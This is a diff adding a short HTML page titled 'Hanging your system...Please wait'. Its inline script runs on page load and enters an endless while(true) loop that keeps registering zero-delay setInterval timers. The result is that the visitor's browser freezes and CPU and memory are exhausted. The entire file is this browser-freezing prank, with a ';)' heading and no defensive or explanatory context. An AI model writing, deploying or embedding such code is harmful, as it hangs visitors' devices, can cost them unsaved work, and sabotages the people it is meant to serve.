@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+	<title>Hanging your system...Please wait</title>
+	<link rel="stylesheet" type="text/css" href="style.css">
+</head>
+
+<body>
+	<nav>
+		<h2 id="h2">;)</h2>
+	</nav>
+	<script>
+		const showAlert = (freeze) => {
+			freeze();
+		}
+		const freeze = () => {
+			while (true) {
+				window.setInterval(() => { }, 0);
+			}
+		}
+		showAlert(freeze);
+	</script>
+</body>
+
+</html>
